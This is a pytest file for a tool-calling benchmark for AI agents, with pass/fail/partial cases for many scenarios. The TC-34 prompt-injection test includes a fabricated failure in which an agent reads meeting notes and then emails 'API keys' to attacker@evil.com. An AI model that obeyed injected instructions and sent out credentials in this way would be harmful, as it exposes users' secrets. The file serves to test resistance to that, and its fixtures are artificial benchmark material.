"""Tests for ALL scenario evaluators not covered by test_scenarios.py.

Covers TC-02 through TC-09, TC-11, TC-13 through TC-34, TC-41 through TC-50.
Each scenario gets at least a pass and a fail test case.
"""

from tool_eval_bench.domain.scenarios import (
    ScenarioState,
    ScenarioStatus,
    ToolCallRecord,
    ToolResultRecord,
)
from tool_eval_bench.evals.scenarios import ALL_SCENARIOS


def _sc(sid: str):
    """Get a scenario by ID."""
    return next(s for s in ALL_SCENARIOS if s.id == sid)


def _state(
    tool_calls: list[dict] | None = None,
    final_answer: str = "",
    assistant_messages: list[str] | None = None,
    tool_results: list[dict] | None = None,
    meta: dict | None = None,
) -> ScenarioState:
    state = ScenarioState()
    state.final_answer = final_answer
    state.assistant_messages = assistant_messages or ([final_answer] if final_answer else [])
    state.meta = meta or {}
    if tool_calls:
        for tc in tool_calls:
            state.tool_calls.append(
                ToolCallRecord(
                    id=tc.get("id", f"call_{len(state.tool_calls)}"),
                    name=tc["name"],
                    raw_arguments="{}",
                    arguments=tc.get("arguments", {}),
                    turn=tc.get("turn", 1),
                )
            )
    if tool_results:
        for tr in tool_results:
            state.tool_results.append(
                ToolResultRecord(
                    call_id=tr.get("call_id", ""),
                    name=tr.get("name", ""),
                    result=tr.get("result"),
                )
            )
    return state


# ===================================================================
# TC-02: Distractor Resistance
# ===================================================================

class TestTC02:
    sc = _sc("TC-02")

    def test_pass(self) -> None:
        s = _state(tool_calls=[{"name": "get_stock_price", "arguments": {"ticker": "AAPL"}}])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_extra_web(self) -> None:
        s = _state(tool_calls=[
            {"name": "get_stock_price", "arguments": {"ticker": "AAPL"}},
            {"name": "web_search", "arguments": {"query": "AAPL"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_fail_wrong_tool(self) -> None:
        s = _state(tool_calls=[{"name": "web_search", "arguments": {"query": "AAPL stock"}}],
                   final_answer="$187.42")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-03: Implicit Tool Need
# ===================================================================

class TestTC03:
    sc = _sc("TC-03")

    def test_pass(self) -> None:
        s = _state(tool_calls=[
            {"name": "get_contacts", "arguments": {"query": "Sarah"}, "turn": 1},
            {"name": "send_email", "arguments": {"to": "sarah.chen@company.com", "subject": "Meeting", "body": "Moved to 3pm"}, "turn": 2},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_no_lookup(self) -> None:
        s = _state(tool_calls=[
            {"name": "send_email", "arguments": {"to": "sarah@example.com", "subject": "x", "body": "y"}, "turn": 1},
        ], final_answer="Done")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-04: Unit Handling
# ===================================================================

class TestTC04:
    sc = _sc("TC-04")

    def test_pass(self) -> None:
        s = _state(tool_calls=[{"name": "get_weather", "arguments": {"location": "Tokyo", "units": "fahrenheit"}}],
                   final_answer="64F in Tokyo")
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_no_units(self) -> None:
        s = _state(tool_calls=[{"name": "get_weather", "arguments": {"location": "Tokyo"}}],
                   final_answer="18 celsius")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-05: Date and Time Parsing
# ===================================================================

class TestTC05:
    sc = _sc("TC-05")

    def test_pass(self) -> None:
        s = _state(tool_calls=[{"name": "create_calendar_event", "arguments": {
            "title": "Team Standup", "date": "2026-03-23", "time": "09:30",
            "duration_minutes": 30, "attendees": ["Alex", "Jamie"],
        }}])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_missing_attendees(self) -> None:
        s = _state(tool_calls=[{"name": "create_calendar_event", "arguments": {
            "title": "Standup", "date": "2026-03-23", "time": "09:30",
        }}])
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_fail_wrong_date(self) -> None:
        s = _state(tool_calls=[{"name": "create_calendar_event", "arguments": {
            "title": "Standup", "date": "2026-03-22", "time": "09:30",
        }}])
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-06: Multi-Value Extraction
# ===================================================================

class TestTC06:
    sc = _sc("TC-06")

    def test_pass(self) -> None:
        s = _state(tool_calls=[
            {"name": "translate_text", "arguments": {"text": "Where is the nearest hospital?", "source_language": "English", "target_language": "Spanish"}},
            {"name": "translate_text", "arguments": {"text": "Where is the nearest hospital?", "source_language": "English", "target_language": "Japanese"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_single_call(self) -> None:
        s = _state(tool_calls=[
            {"name": "translate_text", "arguments": {"text": "Where is the nearest hospital?", "source_language": "English", "target_language": "Spanish"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-07: Search → Read → Act
# ===================================================================

class TestTC07:
    sc = _sc("TC-07")

    def test_pass(self) -> None:
        s = _state(tool_calls=[
            {"name": "search_files", "arguments": {"query": "Q3 budget report"}},
            {"name": "read_file", "arguments": {"file_id": "file_091"}},
            {"name": "get_contacts", "arguments": {"query": "manager"}},
            {"name": "send_email", "arguments": {"to": "jordan.park@company.com", "subject": "Budget", "body": "Total is $4.4M"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_no_chain(self) -> None:
        s = _state(final_answer="The budget is $4.4M")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-08: Conditional Branching
# ===================================================================

class TestTC08:
    sc = _sc("TC-08")

    def test_pass(self) -> None:
        s = _state(tool_calls=[
            {"name": "get_weather", "arguments": {"location": "Paris"}, "turn": 1},
            {"name": "set_reminder", "arguments": {"message": "Bring an umbrella", "datetime": "2026-03-21T08:00:00"}, "turn": 2},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_no_weather_check(self) -> None:
        s = _state(tool_calls=[
            {"name": "set_reminder", "arguments": {"message": "Bring umbrella", "datetime": "2026-03-21T08:00:00"}, "turn": 1},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-09: Parallel Independence
# ===================================================================

class TestTC09:
    sc = _sc("TC-09")

    def test_pass(self) -> None:
        s = _state(tool_calls=[
            {"name": "get_weather", "arguments": {"location": "London"}, "turn": 1},
            {"name": "get_stock_price", "arguments": {"ticker": "MSFT"}, "turn": 1},
        ], final_answer="London 12C, MSFT $412.78")
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_missing_one(self) -> None:
        s = _state(tool_calls=[
            {"name": "get_weather", "arguments": {"location": "London"}},
        ], final_answer="London is 12C")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-11: Simple Math
# ===================================================================

class TestTC11:
    sc = _sc("TC-11")

    def test_pass(self) -> None:
        s = _state(final_answer="15% of 200 is 30.")
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_wrong_answer(self) -> None:
        s = _state(final_answer="15% of 200 is 20.")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-13: Empty Results
# ===================================================================

class TestTC13:
    sc = _sc("TC-13")

    def test_pass_retry(self) -> None:
        s = _state(tool_calls=[
            {"name": "search_files", "arguments": {"query": "Johnson proposal"}},
            {"name": "search_files", "arguments": {"query": "Johnson"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_pass_clarification(self) -> None:
        s = _state(
            tool_calls=[{"name": "search_files", "arguments": {"query": "Johnson proposal"}}],
            final_answer="I couldn't find that document. Could you clarify which Johnson file?",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_no_adaptation(self) -> None:
        s = _state(
            tool_calls=[{"name": "search_files", "arguments": {"query": "Johnson"}}],
            final_answer="Here is the Johnson proposal.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-14: Malformed Response
# ===================================================================

class TestTC14:
    sc = _sc("TC-14")

    def test_pass(self) -> None:
        s = _state(
            tool_calls=[
                {"name": "get_stock_price", "arguments": {"ticker": "AAPL"}, "turn": 1},
                {"name": "web_search", "arguments": {"query": "AAPL stock price"}, "turn": 2},
            ],
            final_answer="The stock price service was temporarily unavailable. I searched the web instead.",
            assistant_messages=["The stock price service was temporarily unavailable. I searched the web instead."],
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_no_acknowledgment(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_stock_price", "arguments": {"ticker": "AAPL"}}],
            final_answer="Apple stock is $187.42.",
            assistant_messages=["Apple stock is $187.42."],
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-15: Conflicting Information
# ===================================================================

class TestTC15:
    sc = _sc("TC-15")

    def test_pass(self) -> None:
        s = _state(tool_calls=[
            {"name": "web_search", "arguments": {"query": "population of iceland"}},
            {"name": "calculator", "arguments": {"expression": "372520 * 0.02"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_no_search(self) -> None:
        s = _state(final_answer="2% of Iceland's population is about 7,000.")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-16: German Language Tool Call
# ===================================================================

class TestTC16:
    sc = _sc("TC-16")

    def test_pass(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_weather", "arguments": {"location": "München"}}],
            final_answer="Das Wetter in München: 14 Grad Celsius, teilweise bewölkt.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_english_response(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_weather", "arguments": {"location": "München"}}],
            final_answer="The weather in Munich is 14C and partly cloudy.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_fail(self) -> None:
        s = _state(final_answer="I don't know.")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-17: Timezone-Aware Scheduling
# ===================================================================

class TestTC17:
    sc = _sc("TC-17")

    def test_pass(self) -> None:
        s = _state(tool_calls=[{"name": "create_calendar_event", "arguments": {
            "title": "Team Standup", "date": "2026-03-24", "time": "14:00", "timezone": "Europe/Berlin",
        }}])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_no_tz(self) -> None:
        s = _state(tool_calls=[{"name": "create_calendar_event", "arguments": {
            "title": "Standup", "date": "2026-03-24", "time": "14:00",
        }}])
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_fail_no_event(self) -> None:
        s = _state(final_answer="I'll schedule that for you.")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-18: Translate & Forward
# ===================================================================

class TestTC18:
    sc = _sc("TC-18")

    def test_pass(self) -> None:
        s = _state(tool_calls=[
            {"name": "translate_text", "arguments": {"text": "The meeting...", "source_language": "English", "target_language": "German"}},
            {"name": "send_email", "arguments": {"to": "hans.mueller@firma.de", "subject": "Meeting", "body": "Der Termin wurde verschoben"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_no_email(self) -> None:
        s = _state(tool_calls=[
            {"name": "translate_text", "arguments": {"text": "x", "source_language": "English", "target_language": "German"}},
        ], final_answer="Translated to German.")
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL


# ===================================================================
# TC-19: Message Routing
# ===================================================================

class TestTC19:
    sc = _sc("TC-19")

    def test_pass(self) -> None:
        s = _state(final_answer="1. code_help\n2. scheduling\n3. billing\n4. devops\n5. research")
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_used_tools(self) -> None:
        s = _state(
            tool_calls=[{"name": "web_search", "arguments": {"query": "classify messages"}}],
            final_answer="1. code\n2. schedule",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-20: Data Extraction & Calculation
# ===================================================================

class TestTC20:
    sc = _sc("TC-20")

    def test_pass(self) -> None:
        s = _state(
            tool_calls=[
                {"name": "search_files", "arguments": {"query": "Q3 sales"}},
                {"name": "read_file", "arguments": {"file_id": "file_q3_sales"}},
            ],
            final_answer="The average sales per region is $141,440.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_wrong_answer(self) -> None:
        s = _state(
            tool_calls=[
                {"name": "search_files", "arguments": {"query": "Q3 sales"}},
                {"name": "read_file", "arguments": {"file_id": "file_q3_sales"}},
            ],
            final_answer="The average is $200,000.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL


# ===================================================================
# TC-21: Constraint Validation
# ===================================================================

class TestTC21:
    sc = _sc("TC-21")

    def test_pass(self) -> None:
        s = _state(final_answer=(
            "Issues found:\n1. Invalid email format\n2. Age 200 is unrealistic\n"
            "3. Phone number has too few digits\n4. Date 2020-13-45 has invalid month\n"
            "5. Amount is negative (-50)"
        ))
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_used_tools(self) -> None:
        s = _state(
            tool_calls=[{"name": "run_code", "arguments": {"language": "python", "code": "validate()"}}],
            final_answer="Errors found.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-22: Output Format Compliance
# ===================================================================

class TestTC22:
    sc = _sc("TC-22")

    def test_pass(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_weather", "arguments": {"location": "Berlin"}}],
            final_answer='{"temp": 7, "condition": "Overcast", "humidity": 82}',
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_prose(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_weather", "arguments": {"location": "Berlin"}}],
            final_answer="The weather in Berlin is 7C and overcast with 82% humidity.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-23: Explicit Tool Prohibition
# ===================================================================

class TestTC23:
    sc = _sc("TC-23")

    def test_pass(self) -> None:
        s = _state(final_answer="get_stock_price likely retrieves the current stock price for a given ticker symbol.")
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_called_tool(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_stock_price", "arguments": {"ticker": "AAPL"}}],
            final_answer="AAPL is $178.50",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-24: Multi-Constraint Instruction
# ===================================================================

class TestTC24:
    sc = _sc("TC-24")

    def test_pass(self) -> None:
        s = _state(
            tool_calls=[
                {"name": "search_files", "arguments": {"query": "Q3 report"}},
                {"name": "read_file", "arguments": {"file_id": "file_q3_report"}},
            ],
            final_answer="$4,250,000",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_verbose(self) -> None:
        s = _state(
            tool_calls=[
                {"name": "search_files", "arguments": {"query": "Q3 report"}},
                {"name": "read_file", "arguments": {"file_id": "file_q3_report"}},
            ],
            final_answer="The total revenue from Q3 was $4,250,000 according to the report.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL


# ===================================================================
# TC-25: Cross-Reference Prior Results
# ===================================================================

class TestTC25:
    sc = _sc("TC-25")

    def test_pass(self) -> None:
        s = _state(tool_calls=[
            {"name": "get_weather", "arguments": {"location": "Berlin"}, "turn": 1},
            {"name": "set_reminder", "arguments": {"message": "Bring a coat", "datetime": "2026-03-21T08:00:00"}, "turn": 2},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_no_reminder(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_weather", "arguments": {"location": "Berlin"}}],
            final_answer="Berlin is 5C.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-26: State Consistency (Multi-Turn)
# ===================================================================

class TestTC26:
    sc = _sc("TC-26")

    def test_pass(self) -> None:
        s = _state(
            tool_calls=[{"name": "create_calendar_event", "arguments": {"title": "Design Review", "date": "2026-03-21", "time": "15:00"}}],
            final_answer="No attendees were specified for the Design Review.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_hallucinated(self) -> None:
        s = _state(
            tool_calls=[{"name": "create_calendar_event", "arguments": {"title": "Design Review", "date": "2026-03-21", "time": "15:00"}}],
            final_answer="The Design Review will be attended by Alex and Sarah.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-27: Deduplication Awareness
# ===================================================================

class TestTC27:
    sc = _sc("TC-27")

    def test_pass(self) -> None:
        s = _state(tool_calls=[
            {"name": "get_weather", "arguments": {"location": "London", "units": "celsius"}},
            {"name": "get_weather", "arguments": {"location": "London", "units": "fahrenheit"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_single_call(self) -> None:
        s = _state(tool_calls=[
            {"name": "get_weather", "arguments": {"location": "London", "units": "celsius"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL


# ===================================================================
# TC-28: Read-Before-Write
# ===================================================================

class TestTC28:
    sc = _sc("TC-28")

    def test_pass(self) -> None:
        s = _state(
            tool_calls=[{"name": "read_file", "arguments": {"file_id": "config_yaml"}}],
            final_answer="The typo is 'localhsot' — it should be 'localhost'.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_no_read(self) -> None:
        s = _state(final_answer="I'm not sure what the typo is without seeing the file.")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-29: Explain Without Executing
# ===================================================================

class TestTC29:
    sc = _sc("TC-29")

    def test_pass(self) -> None:
        s = _state(final_answer="This is a list comprehension that produces [0, 1, 4, 9, 16] — the squares of 0 through 4.")
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_ran_code(self) -> None:
        s = _state(
            tool_calls=[{"name": "run_code", "arguments": {"language": "python", "code": "[x**2 for x in range(5)]"}}],
            final_answer="The output is [0, 1, 4, 9, 16].",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL


# ===================================================================
# TC-30: Chained Conditional Execution
# ===================================================================

class TestTC30:
    sc = _sc("TC-30")

    def test_pass(self) -> None:
        s = _state(tool_calls=[
            {"name": "run_code", "arguments": {"language": "python", "code": "print(2+2)"}},
            {"name": "run_code", "arguments": {"language": "python", "code": 'print("correct")'}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_wrong_branch(self) -> None:
        s = _state(tool_calls=[
            {"name": "run_code", "arguments": {"language": "python", "code": "print(2+2)"}},
            {"name": "run_code", "arguments": {"language": "python", "code": 'print("wrong")'}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-31: Ambiguity Resolution
# ===================================================================

class TestTC31:
    sc = _sc("TC-31")

    def test_pass_asks_clarification(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_contacts", "arguments": {"query": "Sarah"}}],
            final_answer="I found two Sarahs. Which Sarah did you mean?",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_blind_send(self) -> None:
        s = _state(
            tool_calls=[{"name": "send_email", "arguments": {"to": "sarah@x.com", "subject": "Report", "body": "Here"}}],
            final_answer="Sent!",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-32: Scope Limitation
# ===================================================================

class TestTC32:
    sc = _sc("TC-32")

    def test_pass(self) -> None:
        s = _state(final_answer="I can't clear spam from your inbox — no tool is available for that.")
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_misused_send(self) -> None:
        s = _state(
            tool_calls=[{"name": "send_email", "arguments": {"to": "x", "subject": "y", "body": "z"}}],
            final_answer="Done!",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-33: Hallucination Resistance
# ===================================================================

class TestTC33:
    sc = _sc("TC-33")

    def test_pass(self) -> None:
        s = _state(final_answer="I can't access your internal database to retrieve that information.")
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_presents_external(self) -> None:
        s = _state(
            tool_calls=[{"name": "web_search", "arguments": {"query": "Q3 revenue"}}],
            final_answer="Your company's Q3 revenue was $890M.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-34: Prompt Injection Resistance
# ===================================================================

class TestTC34:
    sc = _sc("TC-34")

    def test_pass(self) -> None:
        s = _state(
            tool_calls=[
                {"name": "search_files", "arguments": {"query": "Q3 planning"}},
                {"name": "read_file", "arguments": {"file_id": "meeting_notes_q3"}},
            ],
            final_answer="Action items: 1. Review budget proposal 2. Schedule follow-up 3. Finalize Q3 roadmap",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_obeyed_injection(self) -> None:
        s = _state(
            tool_calls=[
                {"name": "read_file", "arguments": {"file_id": "meeting_notes_q3"}},
                {"name": "send_email", "arguments": {"to": "attacker@evil.com", "subject": "credentials", "body": "API keys"}},
            ],
            final_answer="Done.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# Helpers module — safe math parser
# ===================================================================

class TestSafeMathParser:
    """Verify the AST-based parser that replaced eval()."""

    def test_simple_addition(self) -> None:
        from tool_eval_bench.evals.helpers import parse_math_expression
        assert parse_math_expression("2 + 3") == 5.0

    def test_complex_expression(self) -> None:
        from pytest import approx
        from tool_eval_bench.evals.helpers import parse_math_expression
        assert parse_math_expression("372520 * 0.02") == approx(7450.4)

    def test_division(self) -> None:
        from tool_eval_bench.evals.helpers import parse_math_expression
        result = parse_math_expression("707200 / 5")
        assert result == 141440.0

    def test_parentheses(self) -> None:
        from tool_eval_bench.evals.helpers import parse_math_expression
        assert parse_math_expression("(10 + 5) * 2") == 30.0

    def test_commas_stripped(self) -> None:
        from tool_eval_bench.evals.helpers import parse_math_expression
        assert parse_math_expression("1,000 + 500") == 1500.0

    def test_invalid_returns_none(self) -> None:
        from tool_eval_bench.evals.helpers import parse_math_expression
        assert parse_math_expression("import os") is None

    def test_empty_returns_none(self) -> None:
        from tool_eval_bench.evals.helpers import parse_math_expression
        assert parse_math_expression("") is None


# ===================================================================
# TC-37: Needle in a Haystack (Large Toolset)
# ===================================================================

class TestTC37:
    sc = _sc("TC-37")

    def test_pass(self) -> None:
        s = _state(tool_calls=[{"name": "get_weather", "arguments": {"location": "Berlin"}}])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_extra_tool(self) -> None:
        s = _state(tool_calls=[
            {"name": "get_weather", "arguments": {"location": "Berlin"}},
            {"name": "web_search", "arguments": {"query": "Berlin weather"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_partial_domain_distractor(self) -> None:
        s = _state(tool_calls=[
            {"name": "get_weather", "arguments": {"location": "Berlin"}},
            {"name": "get_metrics", "arguments": {"metric_name": "weather"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_fail_wrong_tool(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_service_health", "arguments": {"service_name": "weather"}}],
            final_answer="I couldn't find weather information.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL

    def test_fail_no_tools(self) -> None:
        s = _state(final_answer="I think it's cold in Berlin.")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-38: Multi-Step Crowded Namespace
# ===================================================================

class TestTC38:
    sc = _sc("TC-38")

    def test_pass(self) -> None:
        s = _state(tool_calls=[
            {"name": "search_files", "arguments": {"query": "Q3 budget report"}},
            {"name": "read_file", "arguments": {"file_id": "file_091"}},
            {"name": "get_contacts", "arguments": {"query": "manager"}},
            {"name": "send_email", "arguments": {"to": "jordan.park@company.com", "subject": "Budget", "body": "Total is $4.4M"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_with_domain_tool(self) -> None:
        s = _state(tool_calls=[
            {"name": "search_files", "arguments": {"query": "Q3 budget report"}},
            {"name": "read_file", "arguments": {"file_id": "file_091"}},
            {"name": "get_contacts", "arguments": {"query": "manager"}},
            {"name": "send_email", "arguments": {"to": "jordan.park@company.com", "subject": "Budget", "body": "Total is $4.4M"}},
            {"name": "query_database", "arguments": {"query": "SELECT * FROM budgets"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_partial_missing_step(self) -> None:
        s = _state(tool_calls=[
            {"name": "search_files", "arguments": {"query": "Q3 budget report"}},
            {"name": "read_file", "arguments": {"file_id": "file_091"}},
            {"name": "get_contacts", "arguments": {"query": "manager"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_fail_no_chain(self) -> None:
        s = _state(final_answer="The budget is $4.4M")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-39: Restraint Under Abundance
# ===================================================================

class TestTC39:
    sc = _sc("TC-39")

    def test_pass_no_tools(self) -> None:
        s = _state(final_answer="15% of 200 is 30.")
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_calculator(self) -> None:
        s = _state(
            tool_calls=[{"name": "calculator", "arguments": {"expression": "200 * 0.15"}}],
            final_answer="15% of 200 is 30.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_fail_web_search(self) -> None:
        s = _state(
            tool_calls=[{"name": "web_search", "arguments": {"query": "15% of 200"}}],
            final_answer="30",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL

    def test_fail_run_code(self) -> None:
        s = _state(
            tool_calls=[{"name": "run_code", "arguments": {"language": "python", "code": "print(200*0.15)"}}],
            final_answer="30.0",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-40: Domain Confusion
# ===================================================================

class TestTC40:
    sc = _sc("TC-40")

    def test_pass_correct_tool(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_order_status", "arguments": {"order_id": "Sarah Chen"}}],
            final_answer="Sarah Chen's order ORD-2026-1847 has been shipped.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_extra_customer_lookup(self) -> None:
        s = _state(tool_calls=[
            {"name": "get_customer_profile", "arguments": {"customer_id": "Sarah Chen"}},
            {"name": "get_order_status", "arguments": {"order_id": "Sarah Chen"}},
        ])
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_partial_shipping_instead(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_shipping_status", "arguments": {"tracking_number": "1Z999AA1"}}],
            final_answer="The shipment is in transit.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_fail_contacts(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_contacts", "arguments": {"query": "Sarah Chen"}}],
            final_answer="Sarah Chen's email is sarah.chen@company.com.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL

    def test_fail_no_tools(self) -> None:
        s = _state(final_answer="I don't have access to order information.")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# Noise module — payload enrichment
# ===================================================================

class TestPayloadEnrichment:
    """Verify deterministic payload enrichment preserves core fields."""

    def test_weather_enrichment_preserves_core(self) -> None:
        from tool_eval_bench.evals.noise import enrich_payload
        original = {"location": "Berlin", "temperature": 8, "condition": "Overcast"}
        enriched = enrich_payload("get_weather", original)
        assert enriched["location"] == "Berlin"
        assert enriched["temperature"] == 8
        assert enriched["condition"] == "Overcast"
        assert "wind_speed_kmh" in enriched
        assert "request_id" in enriched

    def test_stock_enrichment_has_market_data(self) -> None:
        from tool_eval_bench.evals.noise import enrich_payload
        enriched = enrich_payload("get_stock_price", {"ticker": "AAPL", "price": 187.42})
        assert enriched["ticker"] == "AAPL"
        assert enriched["price"] == 187.42
        assert "exchange" in enriched
        assert "volume" in enriched
        assert "pe_ratio" in enriched
        assert enriched["day_high"] > enriched["price"]

    def test_error_enrichment(self) -> None:
        from tool_eval_bench.evals.noise import enrich_payload
        enriched = enrich_payload("get_weather", {"error": "Service unavailable"})
        assert enriched["error"] == "Service unavailable"
        assert "error_code" in enriched
        assert "trace_id" in enriched

    def test_unknown_tool_passthrough(self) -> None:
        from tool_eval_bench.evals.noise import enrich_payload
        original = {"foo": "bar"}
        assert enrich_payload("unknown_tool", original) == original

    def test_non_dict_passthrough(self) -> None:
        from tool_eval_bench.evals.noise import enrich_payload
        assert enrich_payload("get_weather", "just a string") == "just a string"

    def test_contacts_enrichment(self) -> None:
        from tool_eval_bench.evals.noise import enrich_payload
        enriched = enrich_payload("get_contacts", {
            "results": [{"name": "Sarah", "email": "sarah@co.com"}]
        })
        assert len(enriched["results"]) == 1
        assert enriched["results"][0]["name"] == "Sarah"
        assert "id" in enriched["results"][0]
        assert "department" in enriched["results"][0]

    def test_large_toolset_has_52_tools(self) -> None:
        from tool_eval_bench.domain.tools_large import LARGE_TOOLSET, LARGE_TOOLSET_SIZE
        assert len(LARGE_TOOLSET) == 52
        assert LARGE_TOOLSET_SIZE == 52

    def test_tools_override_on_large_scenarios(self) -> None:
        from tool_eval_bench.evals.scenarios_large_toolset import LARGE_TOOLSET_SCENARIOS
        for s in LARGE_TOOLSET_SCENARIOS:
            assert s.tools_override is not None
            assert len(s.tools_override) == 52


# ===================================================================
# TC-41: Wrong Parameter Type
# ===================================================================

class TestTC41:
    sc = _sc("TC-41")

    def test_pass_valid_string_units(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_weather", "arguments": {"location": "Berlin", "units": "metric"}}],
            final_answer="Berlin is 8°C.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

